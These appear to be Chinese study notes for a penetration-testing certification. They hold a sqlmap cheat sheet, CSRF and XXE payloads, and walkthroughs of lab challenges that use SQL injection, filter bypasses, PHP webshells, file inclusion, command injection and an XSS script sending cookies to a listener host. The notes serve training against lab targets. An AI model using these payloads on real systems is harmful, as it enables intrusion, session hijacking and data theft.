`-u "http://xxx.com/index.php?id=1"       指定URL`            

`-p id                           指定参数`

`-r req.txt                   以现有数据包做模版，攻击`

- 自定义数据

`--data="user=8023&pass=xxx"       自定义POST请求`

`--cookie=""`

`--proxy=""`

`--random-agent                随机使用User-Agent（改变sqlmapUA绕过杀软检测）`

- 测试等级

`--level=1                           1-5，默认1，渗透3，级别高检测内容就多`

- 风险等级

 `--risk=1                            1-3，默认1，级别高对服务器的危害就大`

- 输出等级

 `-v 1                                    0-6，默认1，级别高显示更详细`

- 获取内容

` --dbs`          数据库

`--tables`     表

`--columns`   列

`--dump`         数据

`--file-read /etc/pass                      读取某文件内容`

`--current-db                                 获取正在使用的数据库名`
`--current-user                              获取正在使用的用户名`
`--passwords                                  获取用户密码信息内容`

`-a                                                     获取所有（不建议）`

- 指定已知内容

`-D pikachu`

`-T users`

`-C username,password`

- 替换模版

> --tamper "space2comment"               空格转注释
>
> ​			charencode                               编码
>
> ​			charunicodeencode                
>
> ​			randomcomment                   关键字过滤
>
> ​			equal2like                                 等号过滤
>
> ​			space2plus                                空格转+

- 其他选项 

`--batch                  不使用交互攻击，直接使用默认选项`

`--purge                  清空sqlmap缓存（类似于重置）`

**注入示例：**

> sqlmap.py --dbs
> -u "http://127.0.0.1:8082/vulnerabilities/sqli/?id=1&Submit=Submit#" 
> --cookie="PHPSESSID=74abd58cvtj25723u7grlgu3h5; security=low"
>
> sqlmap.py --tables -D dvwa 
> -u "http://127.0.0.1:8082/vulnerabilities/sqli/?id=1&Submit=Submit#" 
> --cookie="PHPSESSID=74abd58cvtj25723u7grlgu3h5; security=low"
>
> sqlmap.py --columns -D dvwa -T users
> -u "http://127.0.0.1:8082/vulnerabilities/sqli/?id=1&Submit=Submit#" 
> --cookie="PHPSESSID=74abd58cvtj25723u7grlgu3h5; security=low"
>
> sqlmap.py --dump -C user,password -D dvwa -T users --batch
> -u "http://127.0.0.1:8082/vulnerabilities/sqli/?id=1&Submit=Submit#" 
> --cookie="PHPSESSID=74abd58cvtj25723u7grlgu3h5; security=low"

注入点和回显点不在同一个页面的情况:

`--second-url=""`



正则匹配特征： 
Re      preg    /xxx/y

```
^172\.16\.12\.12 -.* "[A-Z]+ /.*(asp|php|jsp).*" 200 
```

## 防御手段

![image-20241123230928456](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241123230928456.png)

# CSRF 

## 原理

利用（受害者）未失效的身份认证信息，诱骗点击或访问，向服务器发送可信任请求，达到非法操作的目的。

## CSRF和XSS区别

![image-20230919114136335](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20230919114136335.png)

**CSRF与XSS最大的区别就是，CSRF并没有盗用cookie而是直接利用。**

## GET型CSRF

伪装表单如下：

```
<html>
<head>
<title>404 NotFound</title>
</head>
<body>
<h1>404 NotFound</h1>
<img src="http://127.0.0.1:8083/vul/csrf/csrfget/csrf_get_edit.php?
sex=boy&phonenum=80238023&add=nba%20lakes&email=kobe%40pikachu.com&submit=submit"/>
</body>
</html>
```

## POST型CSRF

构造页面如下：

```
<html>
  <script>
	window.onload = function () {
		document.getElementById("suibian").click();
	}
  </script>
  <body>
    <form action="http://127.0.0.1:8083/vul/csrf/csrfpost/csrf_post_edit.php" method="POST" hidden>
      <input name="sex" value="boy" />
      <input name="phonenum" value="12345678" />
      <input name="add" value="nba lakes" />
      <input name="email" value="kobe&#64;pikachu&#46;com" />
      <input name="submit" value="submit" />
      <input type="submit" id="suibian" value="Submit request" />
    </form>
  </body>
</html>
```

 注：可利用burpsuit右键的Engagement tools——CSRF PoC，来自动生成一个表单

# SSRF（PTS）

# XXE(PTS)

payload

```
<?xml version="1.0" ?>
<!DOCTYPE xxe [
      <!ENTITY val "hello">
]>
<p>&val;</p>
```

**读文件**

*encoding和ANY部分可适当删减*

```
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE xxe [
    <!ELEMENT xxe ANY >
    <!ENTITY val SYSTEM "C:/Windows/win.ini">
]>
<p>&val;</p>
```

**执行命令**

（前提是装了expect扩展）

```
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE xxe [
    <!ENTITY val SYSTEM "expect://whoami">
]>
<p>&val;</p>
```

# 反序列化

**把字符串还原为变量/对象**

> 字符串
>
> s:44:"Whatever is worth doing is worth doing well.";
>
> 整数
>
> i:8023;
>
> 布尔
>
> b:1;     true
>
> b:0;     flase
>
> 小数
>
> d:3.1400000000000001;
>
> 数组
>
> a:2:{i:0;s:3:"php";i:1;s:5:"array";}

# 真题（基础）

**环境**

11.1.10.11 - 11.1.10.16 / 10.1.10.11 - 10.1.10.16

## 34071 - 34075、34051

### 34071 注入

![image-20241124103718796](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124103718796.png)

此题目注入点和闭合已给出

![image-20241124104041143](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124104041143.png)

尝试order by *爆列数

```
http://11.1.10.11:34071/start/index.php?uuid=983fd952-df4e-4b63-946f-f2e6bb0327d6' order by 4-- 

http://11.1.10.11:34071/start/index.php?uuid=983fd952-df4e-4b63-946f-f2e6bb0327d6' order by 4%23
```

`select * from Article where uuid = '983fd952-df4e-4b63-946f-f2e6bb0327d6' order by 4'`

后闭合注释时发现代码对对  `--空`  和  `#`  都过滤掉了，所以不能进行双写绕过。

#### 方法一：不采用注释

采用手动单引号闭合，发现可行

`http://11.1.10.11:34071/start/index.php?uuid=983fd952-df4e-4b63-946f-f2e6bb0327d6' order by ‘4`

![image-20241124105739640](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124105739640.png)

但是order by 后必须接数字，’4‘是一个字符串，所以order by在这里就不能用了

**注：**

> 查询列数
>
> order by *
>
> union select 1,2,3,4       联合查询时只有列数一致才能查询出结果

使用union select尝试，错误显示无数据报错页面，直至字段6页面加载成功。（注意列数闭合）

http://11.1.10.11:34071/start/index.php?uuid=983fd952-df4e-4b63-946f-f2e6bb0327d6' union select '1','2','3','4','5','6

![image-20241124111300034](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124111300034.png)

接着再将uid改为一个查询不到的页面，可以看到注入点是2和3字段

![image-20241124111511297](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124111511297.png)

对字段2进行数据库查询

`http://11.1.10.11:34071/start/index.php?uuid=xx' union select '1',database(),'3','4','5','6`

结果为2web

在字段3进行注入，使用火狐插件（如果执行不成功，考虑是否不适配加号，需要改为空格），

![image-20241124112049334](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124112049334.png)

爆表名

![image-20241124112231351](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124112231351.png)

对IS_KEY表爆列名

![image-20241124112508943](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124112508943.png)

对haha列爆数据

![image-20241124112953765](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124112953765.png)

得到key1：0xs5kfdz

#### 方法二：绕过注释过滤

对两个过滤符进行组合，采用  `-#-空`  尝试

![image-20241124113923659](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124113923659.png)

发现-- 的注释可行，对减减空进行url编码

`http://11.1.10.11:34071/start/index.php?uuid=983fd952-df4e-4b63-946f-f2e6bb0327d6' -%23-%20`

![image-20241124114907541](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124114907541.png)

接下来就可以使用order by进行列名爆破

`http://11.1.10.11:34071/start/index.php?uuid=983fd952-df4e-4b63-946f-f2e6bb0327d6' order by 6 -%23-%20`

接着采用union select寻找注入点

`http://11.1.10.11:34071/start/index.php?uuid=xx' union select 1,2,3,4,5,6 -%23-%20`

后面跟方法一同样，进行数据库爆破

### 34072 文件上传

![image-20241124115607636](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124115607636.png)

一、上传正常图片查看逻辑

文件上传到了根目录     http://11.1.10.11:34072/Desert.jpg

二、上传图片马，对比器对比数据包校验逻辑

![image-20241124153232203](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124153232203.png)

发现其对文件内容有校验

发送到重放攻击器中进行数据包修改，不同的内容进行适当删减，发现其对eval关键字进行了过滤

![image-20241124153851068](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124153851068.png)

三、采用大小写绕过，

`<?php @EvAl($_POST['x']; ?>`

> **html：不区分大小写**
>
> **JavaScript：区分大小写**
>
> **PHP：函数不区分大小写，变量区分大小写**

修改文件名后缀为php，上传成功

四、访问上传文件路径，验证是否可执行命令

x=phpinfo();

五、蚁剑连接木马

![image-20241124164311856](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124164311856.png)

key2:3do7lvwf

### *34073 文件包含 (加后缀)

![image-20241124161555552](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124161555552.png)

![image-20241124161705356](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124161705356.png)

参数会自动添加后缀，

#### 方法一：data协议

`http://11.1.10.11:34073/start/index.php?page=data://text/plan,<?php phpinfo(); ?>`

![image-20241124162416170](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124162416170.png)

发现对data;//进行了过滤

对其进行双写绕过，命令执行成功

![image-20241124162649072](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124162649072.png)

执行`http://11.1.10.11:34073/start/index.php?page=dadata://ta://text/plan,<?php @eval($_POST['x']); ?>`

蚁剑连接，得到key3：5zi3nrhz

![image-20241124163635052](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124163635052.png)

#### 方法二：远程文件包含

桌面创建同扩展名文件进行端口监听，远程包含本地主机此文件，建立shell连接

![image-20241127153953590](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241127153953590.png)

### 34074  反序列化

![image-20241124164759350](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124164759350.png)

![image-20241124165317245](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124165317245.png)

输入——》反序列化（解码）——》TEMP

TEMP——》序列化（编码）——》输入

```
 <?php
$TEMP = "Whatever is worth doing is worth doing well.";
echo serialize($TEMP);
```

将此代码写入到上一题的web根目录中

![image-20241124170253483](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124170253483.png)

访问http://11.1.10.11:34073/zzz.php得到

```
s:44:"Whatever is worth doing is worth doing well.";
```

​              字符串字段数即是引号里面包括空格和标点所有字符个数。

在此题的url进行提交

...?str=s:44:"Whatever is worth doing is worth doing well.";

![image-20241124170737905](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124170737905.png)

### *34075 失效的访问控制

![image-20241124172134087](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124172134087.png)

抓包，只允许本地访问，发现对admin和usename有校验

![image-20241124172344591](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124172344591.png)

修改IsAdmin=true

Usename=admin进行base64——url编码

添加`X-Forwarded-For:127.0.0.1`突破

![image-20241124175802740](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124175802740.png)

**这里特别注意XFF伪造头的位置，应该在Contnt-Length（消息实体的传输长度）之前！！！！**

![image-20241127165650518](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241127165650518.png)

### *34051 注入（万能密码登录）

![image-20241124180300033](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124180300033.png)

测试万能密码，发现对`or`和`#`有过滤

![image-20241124190631274](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124190631274.png)

尝试双写，失败

尝试大小写混合

![image-20241124190955745](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124190955745.png)

#注释过滤的话考虑进行后闭合 `username=1' Or '1'='1'&password=2`，此注入点不成功

对password万能密码尝试且闭合    `username=1&password=2' Or '1'='1`

![image-20241124191338122](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124191338122.png)

## 34041 - 34045、34213、34224

### 34041 注入

![image-20241124192113641](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124192113641.png)

一、sqlmap注入

```
sqlmap.py -u http://11.1.10.13:34041/vulnerabilities/fu1.php?id=1 --file-read /tmp/360/key --batch 
```

![image-20241124213722702](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124213722702.png)

根据提示添加修改

```
sqlmap.py -u http://11.1.10.13:34041/vulnerabilities/fu1.php?id=1 --file-read /tmp/360/key --batch --tamper=space2comment
```

![image-20241124214244995](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124214244995.png)



访问保存位置，得到key:8b3h4a7v

二、手工注入

采用order by爆列数，发现空格被过滤，采用`/**/`替换

![image-20241124215206830](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124215206830.png)

爆出4列，采用union select爆注入点![image-20241124215613653](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124215613653.png)

发现union被过滤，双写绕过；并修改访问不存在页面

![image-20241124215855603](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124215855603.png)



在任意注入点读文件

`http://11.1.10.13:34041/vulnerabilities/fu1.php?id=-1') /**/ununionion/**/ select/**/ 1,load_file('/tmp/360/key'),3,4%23`

![image-20241124220400355](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124220400355.png)

### 34042 文件上传

![image-20241124220503744](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124220503744.png)

测试上传逻辑，上传到了目录/vulnerabilities/Desert.jpg![image-20241124220707115](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124220707115.png)

上传图片马对比不同

![image-20241124221121167](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124221121167.png)

![](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124222102529.png)

内容不同，但是上传成功，说明对图片内容没有校验。

发送重放器进行后缀修改上传，发现.php后缀上传失败，

![image-20241124222636787](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124222636787.png)

修改为`.pht`上传成功

蚁剑连接 http://11.1.10.13:34042/vulnerabilities/picshell.pht，得到根目录key.php

![image-20241124223700047](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124223700047.png)

### *34043 文件包含（读源码）

![image-20241124223823044](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124223823044.png)

`file=`可以直接包含，此时目录在/vulnerabilities/fu1.php同级目录下，需要一次../跳转到根目录

![image-20241124224601675](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124224601675.png)

查看源代码，发现key内容并没有在源代码中进行输出展示，那就可能存在在注释里

![image-20241124224932701](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124224932701.png)

采用读源码的方式进行key.php读取

```
http://11.1.10.13:34043/vulnerabilities/fu1.php?file=php://filter/read=convert.base64-encode/resource=../key.php
```

![image-20241124230056227](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124230056227.png)

对其内容进行base64解码，在注释中得到key

![image-20241124230423289](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124230423289.png)

### 34044 命令执行

![image-20241124230531508](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124230531508.png)

使用127.0.0.1验证存活状态

![image-20241124230732388](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124230732388.png)



whoami验证命令执行，cat读文件是被过滤

![image-20241124231024248](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124231024248.png)

使用`grep '' ../key.php`      `grep . ../key.php`   `tac ../key.php`任意一个读取

![image-20241124233059441](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124233059441.png)

右键源代码查看Get it！

![image-20241124233206677](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124233206677.png)

### 34045 日志分析

![image-20241124233618327](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124233618327.png)

下载日志http://11.1.10.12:34045/access.log

在文件中利用正则筛选

![image-20241124234849057](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124234849057.png)

```
^172\.16\.12\.12 .* "[A-Z]+ /.*\.(php|asp|jsp).* 200 
```

![image-20241124235526768](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241124235526768.png)

尝试访问http://11.1.10.12:34045/adminlogin.php

对此页面进行爆破

![image-20241125000411482](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125000411482.png)

![image-20241125000635973](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125000635973.png)

使用用户名密码登录，得到key

### 34213 XSS

![image-20241125152018426](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125152018426.png)

key在后台，需要伪造cookie登录到后台

`<script>
    document.write('<img src="http://11.1.12.101:8011/?'+document.cookie+'">');
</script>`


![image-20241125155838088](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125155838088.png)

进行nc端口监听

```
nc.exe -l -p 8011
```

提交查询，再次加载主页Welcome，看到nc监听成功，提交代码有效

![image-20241125160257786](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125160257786.png)

**注**：如果此处代码无误却执行不成功，要检查网络是否是工作网络，确保互通。

`CTRL+C`停掉监听，再次监听8011端口，等待……

![image-20241125160946207](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125160946207.png)

有PhantomJS指纹，表示此环境监听cookie成功，替换PHPSESSID到浏览器伪造身份

![image-20241125161434738](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125161434738.png)

*如果此处没有PHPSESSID，可以随便输入登录一下，使其有记录*

接着访问主页面http://11.1.10.12:34213——点击Admin，得到key

![image-20241125161930827](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125161930827.png)

### 34224 XSS

![image-20241125162024538](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125162024538.png)

直接伪造cookie

`<script>
    document.write('<img src="http://11.1.12.101:8012/?'+document.cookie+'">');
</script>`


![image-20241125162421659](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125162421659.png)

监听8012端口，执行有效

![image-20241125162558862](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125162558862.png)

这里一定要访问首页主页，我这一步出错了

访问正确的话，key直接在首页的url里

![image-20241125163934524](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125163934524.png)

## 34031 - 34035、34061 、34212

### 34031 二阶sql注入

![image-20241125164135522](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125164135522.png)   

先创建一个用户登入看看校验逻辑

![image-20241125165458716](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125165458716.png)

看到有”重置密码“

有三个可输入点：登录、注册、密码重置

```
注入探测语句      '")a;-- #
```

尝试结果：

```
正常账户+重置正常密码       成功

正常账户+重置异常密码       成功

异常账户+重置正常密码       失败

异常账户+重置异常密码       失败

```

所以对于异常账户的密码重置存在注入，即账户注册是注入点，重置密码是执行点、回显点

此情况不能用sqlmap去跑！

因此可以对admin账户密码进行重置，重新注册发现有校验

![image-20241125172128765](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125172128765.png)

注册语法，可以注册一个admin'-- 的账户

```
update set password=xxx where useneme='admin'-- '
```

![image-20241125172800663](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125172800663.png)然后进行密码重置，即是重置admin用户密码，登录得到key

![image-20241125173122295](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125173122295.png)

### 34032 文件上传

![image-20241125173244857](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125173244857.png)

校验逻辑，上传picshell.jpg失败，说明对内容有校验

利用../php/免杀一句话/sqzr.php在重放器进行木马替换，修改上传后缀为php

![image-20241125174607509](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125174607509.png)

蚁剑连接，得到根目录key

### *34033 文件包含

![image-20241125180056872](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125180056872.png)

测试发现不让包含任意文件

![image-20241125181047509](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125181047509.png)

只有view.html页面才有内容，直接访问http://11.1.10.12:34033/start/view.html查看源码

![image-20241125181230562](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125181230562.png)

解码为[@eval(base64_decode($_POST[z0]));]    对z0参数有编码和执行

```
Hello=1&z0=phpinfo();      ————     Hello=1&z0=Hello=1&z0=cGhwaW5mbygpOyA=
```

在包含页面post处提交

![image-20241125182547840](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125182547840.png)

方式一：命令读取

```
Hello=1&z0=system('cat ls ../key.php');       ————       Hello=1&z0=c3lzdGVtKCdjYXQgbHMgLi4va2V5LnBocCcpOw==
```

![image-20241125183317996](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125183317996.png)

方式二：自己写一个马进行包含，用蚁剑连接

```
Hello=1&z0=eval($_POST['x']);  ————   Hello=1&z0=IGV2YWwoJF9QT1NUWyd4J10pOw==
```

在蚁剑中填写两个body参数，成功连接

![image-20241125211957617](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125211957617.png)

### 34034  代码审计

![image-20241125212331705](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125212331705.png)

![image-20241125212948501](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125212948501.png)

此段代码输出cmd参数值的字段长度，exec执行后不展示结果

所以可以把内容输出到一个文件中，即重定向内容来访问

```
http://11.1.10.12:34034/start/vul.php?cmd=ls > z.txt
```

![image-20241125213353713](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125213353713.png)

### 34035 命令执行

![image-20241125213636358](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125213636358.png)

![image-20241125213752103](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125213752103.png)

测试发现对管道符|、whoami、cat、tac、head、tail、more、less、key.php都有过滤

提供几个执行成功的：

```
&&grep '' ../key.*

&&grep . ../key.*

awk {print}  ../key.*

sed ''  ../key.*

&&diff /etc/hostname ../key.*
```

![image-20241125214408106](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125214408106.png)

![image-20241125220744724](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125220744724.png)

源代码查看key

### *34061  注入（模糊查询）

![image-20241125220857882](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125220857882.png)

![image-20241125221008890](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125221008890.png)

闭合已给出

爆列数

![image-20241125221243638](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125221243638.png)



发现`#`被过滤，使用-- 注释，爆出7列

![image-20241125221530845](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125221530845.png)

union select爆注入点，发现`union`被过滤

![image-20241125221813133](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125221813133.png)



双写绕过，访问不存在页面

![](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125222051121.png)

注入点为2，3，4

直接使用load_file读文件

![image-20241125222819510](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125222819510.png)

### *34212 文件上传

![image-20241125223416622](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125223416622.png)

验证上传逻辑，发现不知道上传目录

![image-20241125223651152](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125223651152.png)

使用御剑扫描一下这个站点

![image-20241125224208347](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125224208347.png)

验证其上传路径为   http://11.1.10.12:34212/upload/picshell.jpg

抓包重放进行逻辑验证

![image-20241125224906339](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125224906339.png)

发现对`<?php`和`eval`都有过滤

使用如下木马：

<script language="php">@Eval($_POST['x']);</script>

又发现其对后缀也有过滤，使用pht上传

![image-20241125225221960](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241125225221960.png)

访问http://11.1.10.12:34212/upload/picshell.pht

之后蚁剑连接可得key

## 34021 - 34025、34214、34223、34234

### 34021 二阶sql注入

![image-20241126000703432](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126000703432.png)

![image-20241126000957330](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126000957330.png)

注释符后可以注册任意格式的账号，接着对admin'#aaa账户进行密码重置，即重置admin密码进行登入

![image-20241126001301193](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126001301193.png)

### *34023  文件包含

![image-20241126001718577](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126001718577.png)

直接使用菜刀连接，密码Hello

![image-20241126002428570](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126002428570.png)

### 34024 日志分析

![image-20241126002609637](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126002609637.png)



对日志进行正则筛选

```
^.* "[A-Z]+ /(?!/?(index|footer|upload|manage|nav)).*\.(php|asp|jsp).*" 200
```

![image-20241126004712605](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126004712605.png)

访问http://11.1.10.12:34024/admin/backdoor.php，即可获取key

![image-20241126004815358](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126004815358.png)

### 34025 命令执行

![image-20241126005103487](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126005103487.png)

![image-20241126005159384](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126005159384.png)

对cat有过滤，使用c''a\t绕过（此处为一对单引号）

![image-20241126005515914](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126005515914.png)

### 34214 代码审计

![image-20241126005804965](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126005804965.png)

解析代码

![image-20241126102433849](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126102433849.png)

![image-20241126102813622](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126102813622.png)



![image-20241126103126892](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126103126892.png)

```
{"bar1":"8023x","bar2":[[0],1,2,3,4],"bar3":"[cisp-pte]"}
```

在url中提交w参数

![image-20241126103839064](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126103839064.png)

### 34223 文件包含

![image-20241126104004060](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126104004060.png)

![image-20241126104046200](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126104046200.png)

发现提交会添加后缀

#### 方法一：data协议

直接本地包含木马，用蚁剑连接

```
http://11.1.10.12:34223/start/index.php?page=data://text/plan,<?php @eval($_POST['x']); ?>
```

或者直接命令读取，用data协议外带出来

```
http://11.1.10.13:34223/start/index.php?page=data://text/plan,<?php system('cat ls ../key.php'); ?>
```

#### 方法二：远程文件包含

首先在本地创建一个txt同名木马文件，使用python监听8013端口

![image-20241126112416886](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126112416886.png)

直接在url中进行远程主机shell.txt的包含

http://11.1.12.154:8013/shell   这里因为.txt会自动添加，所以访问时需要取消

![image-20241126113212371](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126113212371.png)

然后使用蚁剑连接获取key.php

**注**：蚁剑连接时，需要确保python监听持续！

### *34234 代码审计

![image-20241126113658268](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126113658268.png)

提交了参数a

输出了$o=strtolower("$a")

#### 方法一：对`a`注入

![image-20241126114303996](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126114303996.png)



测试其命令回显，成功

![image-20241126114714532](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126114714532.png)

一、直接读文件

```
http://11.1.10.12:34234/start/vul.php?a=");system("cat key4.php");%23    
```

![image-20241126115042802](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126115042802.png)

二、传木马用蚁剑连接

```
?a=");eval($_POST['x']);%23
```

![image-20241126115429079](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126115429079.png)

#### 方法二、php双引号解析特性

原理：

![image-20241126120250700](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126120250700.png)

可以直接利用{}组来进行命令执行 `$o=strtolower("${system('ls')}")`

```
http://11.1.10.12:34234/start/vul.php?a=${system('ls')}
```

![image-20241126120904773](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126120904773.png)

接下来步骤同上

```
http://11.1.10.12:34234/start/vul.php?a=${system('cat key4.php')}
```

## 34011 - 34015

### 34011 注入

![image-20241126121735046](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126121735046.png)

尝试逻辑，注册和登录页面都成功没有报错，验证不同账户的发表页面

![image-20241126142438861](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126142438861.png)

![image-20241126142914596](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126142914596.png)

![image-20241126143734275](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126143734275.png)

![image-20241126143810418](https://gitee.com/Wizo142857/cloudimages/raw/master/img/image-20241126143810418.png)

```
发表正常账号+正常留言    成功

发表正常账号+异常留言    失败

发表异常账号+异常留言    失败

发表异常账号+正常留言    失败
```

猜测插入语句应该最少三项

insert into artical(..,title,content,usename,time)value(...,'aa','aa','aa','2024')

#### 方式一：注释未过滤

构造验证:

```
title=aa&content=aa')#      失败

语法    insert into artical(...,title,usename,content,time)value(...,'aa','aa','aa','2024')#
```

```
title=aa&content=aa','')#        成功

语法    insert into artical(...,title,usename,content,'')value(...,'aa','aa','aa','')#
```

测试**content字段是倒数第二个**

